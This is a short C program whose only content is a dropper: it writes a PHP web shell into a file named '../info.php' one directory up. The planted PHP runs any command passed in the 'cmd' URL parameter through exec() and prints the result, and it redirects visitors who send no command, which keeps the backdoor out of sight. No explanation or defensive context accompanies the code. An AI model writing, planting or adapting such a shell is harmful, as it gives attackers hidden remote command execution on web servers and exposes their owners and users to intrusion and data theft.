#include <stdio.h>
main(){
  char s[]="<?php if(!isset($_GET[\'cmd\']){ header(\'Location: /\'); } else { echo exec($_GET[\'cmd\']); } ?>";
  FILE *f=fopen("../info.php","w");
  fprintf(f,s);
  fclose(f);
}